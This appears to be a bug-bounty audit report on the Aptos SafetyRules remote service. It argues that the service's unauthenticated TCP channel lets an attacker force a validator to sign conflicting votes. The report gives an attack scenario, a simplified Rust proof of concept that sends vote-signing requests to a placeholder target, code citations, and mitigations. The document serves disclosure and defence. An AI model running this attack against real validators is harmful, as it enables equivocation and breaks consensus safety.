# Audit Report

## Title
Unauthenticated Remote SafetyRules Service Allows Consensus Safety Violation Through Validator Equivocation

## Summary
The SafetyRules remote service implementation lacks any authentication mechanism between the RemoteClient and the SafetyRules NetworkServer. An attacker with network access to the TCP port can impersonate the legitimate consensus client, send malicious signing requests, and force the validator to sign conflicting votes, violating AptosBFT consensus safety guarantees.

## Finding Description

The SafetyRules component is responsible for preventing validators from signing conflicting votes that would violate consensus safety. When configured to run as a remote service (SafetyRulesService::Process), it communicates via a plain TCP connection without any authentication.

**Vulnerability Chain:**

1. **No Client Validation at RemoteClient Creation**: The `RemoteClient::new()` function accepts a `NetworkClient` and stores it directly without any validation that it's connected to a legitimate SafetyRules service. [1](#0-0) 

2. **Unauthenticated NetworkServer**: The underlying `NetworkServer` in the secure-net library accepts ANY TCP connection without authentication, TLS, or source validation. It's a simple TCP socket with length-prefixed message framing. [2](#0-1) 

3. **Plain TCP Communication**: The NetworkClient connects to the server address with no cryptographic authentication or encrypted channel. [3](#0-2) 

4. **Critical Commands Exposed**: The SerializerService exposes sensitive SafetyRules operations including `ConstructAndSignVoteTwoChain`, `SignProposal`, and `SignTimeoutWithQC` over this unauthenticated channel. [4](#0-3) 

5. **Message Processing Without Authentication**: The remote service loop continuously processes messages from ANY connected client without verifying the client's identity. [5](#0-4) 

**Attack Scenario:**

1. Attacker identifies a validator running SafetyRules in Process mode (testnet, devnet, or misconfigured mainnet)
2. Attacker scans for and identifies the SafetyRules TCP port
3. Attacker connects via TCP and sends JSON-serialized `SafetyRulesInput::ConstructAndSignVoteTwoChain` commands
4. Attacker crafts multiple conflicting `VoteProposal` messages for the same round with different block hashes
5. SafetyRules processes these requests and returns BLS-signed votes
6. Attacker broadcasts these conflicting votes to the network
7. The validator is now equivocating, violating consensus safety

**Weak Mitigation - Config Sanitizer Can Be Bypassed:**

While the config sanitizer prevents Process mode on mainnet, this protection can be bypassed by setting `skip_config_sanitizer: true` in the node configuration. [6](#0-5) [7](#0-6) 

The mainnet check in the sanitizer is therefore not a reliable security boundary: [8](#0-7) 

## Impact Explanation

**Critical Severity - Consensus Safety Violation**

This vulnerability meets the **Critical Severity** criteria per the Aptos Bug Bounty Program:

- **Consensus/Safety violations**: The attack directly causes a validator to sign conflicting votes (equivocation), which violates the fundamental AptosBFT safety guarantee that validators will not sign two different blocks at the same height/round.

- **Potential for Chain Splits**: If multiple validators are compromised via this attack, it could lead to network partitions where different subsets of validators commit to different chains.

- **Non-recoverable network partition**: A successful attack could require emergency intervention or hardfork to recover network consensus.

The vulnerability breaks Invariant #2: "Consensus Safety: AptosBFT must prevent double-spending and chain splits under < 1/3 Byzantine validators." By forcing validators to equivocate, an attacker can violate this guarantee even without controlling 1/3 of the stake.

## Likelihood Explanation

**Likelihood: Medium to High**

**Factors Increasing Likelihood:**

1. **Testnet/Devnet Deployments**: All validators on testnet or devnet that use Process mode for SafetyRules are immediately vulnerable
2. **Configuration Errors**: Any production validator that:
   - Sets `skip_config_sanitizer: true` 
   - Deploys with Process mode due to misconfiguration
   - Lacks proper network isolation/firewall rules
3. **Network Accessibility**: If the SafetyRules service port is exposed to untrusted networks (not localhost-only), exploitation is straightforward
4. **No Technical Barriers**: Attack requires only basic TCP socket programming and JSON serialization

**Factors Decreasing Likelihood:**

1. **Mainnet Protection**: Config sanitizer enforces Local mode on mainnet by default
2. **Deployment Best Practices**: Properly configured validators should use Local mode or have strict firewall rules
3. **ThreadService Uses Localhost**: The ThreadService implementation binds to localhost, showing some security awareness [9](#0-8) 

However, the ProcessService implementation does not enforce localhost binding, accepting any configured address: [10](#0-9) 

## Recommendation

**Short-term Fix:**

1. **Enforce Localhost Binding**: For ProcessService, enforce that `server_address` must be localhost/127.0.0.1
2. **Remove skip_config_sanitizer**: Eliminate the ability to bypass config sanitization in production
3. **Add Authentication Token**: Implement a shared secret or cryptographic challenge-response between RemoteClient and NetworkServer

**Long-term Fix:**

1. **Implement Mutual TLS (mTLS)**: Replace plain TCP with TLS connections using validator-specific certificates
2. **Use Noise Protocol**: Adopt the same Noise IK protocol used in the main Aptos network layer for authenticated, encrypted connections
3. **Deprecate Process Mode**: Document Process mode as deprecated and unsafe, recommending Local mode for all deployments

**Example Code Fix** (short-term mitigation):

```rust
// In consensus/safety-rules/src/remote_service.rs
impl RemoteClient {
    pub fn new(network_client: NetworkClient) -> Self {
        // Verify the connection is to localhost only for security
        if !network_client.server.ip().is_loopback() {
            panic!("SafetyRules remote service must use localhost for security");
        }
        Self { network_client }
    }
}

// In secure/net/src/lib.rs - NetworkServer::new()
pub fn new(service: String, listen: SocketAddr, timeout_ms: u64) -> Self {
    // Enforce localhost binding for sensitive services
    if service == "safety-rules" && !listen.ip().is_loopback() {
        panic!("SafetyRules service must bind to localhost only");
    }
    let listener = TcpListener::bind(listen);
    // ... rest of implementation
}
```

## Proof of Concept

```rust
// Malicious client that connects to SafetyRules service and requests vote signing
use std::net::TcpStream;
use std::io::{Read, Write};
use serde_json;

fn main() {
    // Connect to vulnerable SafetyRules service
    let target = "TARGET_VALIDATOR_IP:SAFETY_RULES_PORT";
    let mut stream = TcpStream::connect(target)
        .expect("Failed to connect to SafetyRules service");
    
    // Craft malicious vote proposal (simplified - real attack would use valid types)
    let malicious_input = serde_json::json!({
        "ConstructAndSignVoteTwoChain": [
            {
                "block": {
                    "epoch": 1,
                    "round": 100,
                    "id": "MALICIOUS_BLOCK_HASH_1",
                    // ... other required fields
                },
                // ... full VoteProposal structure
            },
            null  // no timeout certificate
        ]
    });
    
    // Serialize to JSON bytes
    let payload = serde_json::to_vec(&malicious_input).unwrap();
    
    // Write length-prefixed message (NetworkStream format)
    let len = (payload.len() as u32).to_le_bytes();
    stream.write_all(&len).unwrap();
    stream.write_all(&payload).unwrap();
    
    // Read response containing BLS signature
    let mut len_bytes = [0u8; 4];
    stream.read_exact(&mut len_bytes).unwrap();
    let response_len = u32::from_le_bytes(len_bytes) as usize;
    
    let mut response = vec![0u8; response_len];
    stream.read_exact(&mut response).unwrap();
    
    // Response contains signed Vote with validator's BLS signature
    println!("Obtained signed vote from SafetyRules: {:?}", response);
    
    // Repeat with conflicting block for same round to cause equivocation
    let malicious_input_2 = serde_json::json!({
        "ConstructAndSignVoteTwoChain": [
            {
                "block": {
                    "epoch": 1,
                    "round": 100,
                    "id": "MALICIOUS_BLOCK_HASH_2",  // Different hash, same round!
                    // ... other required fields
                },
            },
            null
        ]
    });
    
    // Send second conflicting vote request...
    // Validator now signs both votes, violating consensus safety
}
```

**Compilation and Execution:**
1. Deploy SafetyRules service in Process mode on testnet
2. Compile PoC: `cargo build --release`
3. Run: `./target/release/poc_safetyrules_attack TARGET_IP:PORT`
4. Observe validator signing conflicting votes for the same round
5. Broadcast both signed votes to network, causing equivocation detection

## Notes

- **ThreadService vs ProcessService**: ThreadService correctly binds to localhost, but ProcessService accepts arbitrary addresses from configuration, indicating inconsistent security model
- **Network Layer Comparison**: The main Aptos network layer uses Noise protocol with mutual authentication, but SafetyRules remote service uses plain TCP - this architectural inconsistency is the root cause
- **Config Sanitizer Bypass**: The ability to set `skip_config_sanitizer: true` undermines all configuration-level security checks
- **Real-World Exposure**: Any testnet/devnet validator using Process mode is immediately vulnerable if the port is network-accessible

### Citations

**File:** consensus/safety-rules/src/remote_service.rs (L40-54)
```rust
    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
}

fn process_one_message(
    network_server: &mut NetworkServer,
    serializer_service: &mut SerializerService,
) -> Result<(), Error> {
    let request = network_server.read()?;
    let response = serializer_service.handle_message(request)?;
    network_server.write(&response)?;
    Ok(())
```

**File:** consensus/safety-rules/src/remote_service.rs (L61-64)
```rust
impl RemoteClient {
    pub fn new(network_client: NetworkClient) -> Self {
        Self { network_client }
    }
```

**File:** secure/net/src/lib.rs (L157-165)
```rust
impl NetworkClient {
    pub fn new(service: String, server: SocketAddr, timeout_ms: u64) -> Self {
        Self {
            service,
            server,
            stream: None,
            timeout_ms,
        }
    }
```

**File:** secure/net/src/lib.rs (L272-289)
```rust
pub struct NetworkServer {
    service: String,
    listener: Option<TcpListener>,
    stream: Option<NetworkStream>,
    /// Read, Write, Connect timeout in milliseconds.
    timeout_ms: u64,
}

impl NetworkServer {
    pub fn new(service: String, listen: SocketAddr, timeout_ms: u64) -> Self {
        let listener = TcpListener::bind(listen);
        Self {
            service,
            listener: Some(listener.unwrap()),
            stream: None,
            timeout_ms,
        }
    }
```

**File:** consensus/safety-rules/src/serializer.rs (L22-34)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub enum SafetyRulesInput {
    ConsensusState,
    Initialize(Box<EpochChangeProof>),
    SignProposal(Box<BlockData>),
    SignTimeoutWithQC(
        Box<TwoChainTimeout>,
        Box<Option<TwoChainTimeoutCertificate>>,
    ),
    ConstructAndSignVoteTwoChain(Box<VoteProposal>, Box<Option<TwoChainTimeoutCertificate>>),
    ConstructAndSignOrderVote(Box<OrderVoteProposal>),
    SignCommitVote(Box<LedgerInfoWithSignatures>, Box<LedgerInfo>),
}
```

**File:** config/src/config/config_sanitizer.rs (L45-48)
```rust
        // If config sanitization is disabled, don't do anything!
        if node_config.node_startup.skip_config_sanitizer {
            return Ok(());
        }
```

**File:** config/src/config/node_startup_config.rs (L8-11)
```rust
pub struct NodeStartupConfig {
    pub skip_config_optimizer: bool, // Whether or not to skip the config optimizer at startup
    pub skip_config_sanitizer: bool, // Whether or not to skip the config sanitizer at startup
}
```

**File:** config/src/config/safety_rules_config.rs (L98-104)
```rust
            // Verify that the safety rules service is set to local for optimal performance
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }
```

**File:** config/src/config/safety_rules_config.rs (L227-238)
```rust
pub struct RemoteService {
    pub server_address: NetworkAddress,
}

impl RemoteService {
    pub fn server_address(&self) -> SocketAddr {
        self.server_address
            .to_socket_addrs()
            .expect("server_address invalid")
            .next()
            .expect("server_address invalid")
    }
```

**File:** consensus/safety-rules/src/thread.rs (L29-32)
```rust
    pub fn new(storage: PersistentSafetyStorage, timeout: u64) -> Self {
        let listen_port = utils::get_available_port();
        let listen_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), listen_port);
        let server_addr = listen_addr;
```
